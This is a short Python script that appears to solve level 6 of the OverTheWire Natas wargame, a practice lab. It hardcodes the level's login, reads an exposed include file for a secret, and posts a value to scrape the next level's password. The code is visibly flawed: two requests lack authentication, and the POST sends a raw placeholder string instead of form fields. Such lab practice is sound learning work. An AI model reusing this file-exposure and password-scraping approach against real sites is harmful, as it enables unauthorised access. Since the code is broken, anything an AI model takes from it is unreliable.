import os, sys
import requests
import re

#password = 

user= 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
url = 'http://'+user+'.natas.labs.overthewire.org'

website = requests.get(url, auth=(user,password))
response = website.text
print(response)

# Rest of the code is challenge specific:

newUrl = 'http://'+user+'.natas.labs.overthewire.org/'
newRequest= requests.get(newUrl, auth=(user,password))
getResponse = newRequest.text
foundSecret = re.findall("secret:(.*)", getResponse)

for s in range(len(foundSecret)):
    print(foundSecret[s])

secretUrl = 'http://'+user+'.natas.labs.overthewire.org/includes/secret.inc/'
getSecret = requests.get(secretUrl).text
print(re.findall('secret:(.*)', getSecret))

secret = 'FOEIUWGHFEEUHOFUOIU'

postRequest = requests.post(url=newUrl, data=secret) 
postResponse = postRequest.text
print(postResponse)

foundPasswords = re.findall('natas7(.*)', postResponse)
print('Found passwords:')
for p in range(len(foundPasswords)):
    print(foundPasswords[p])
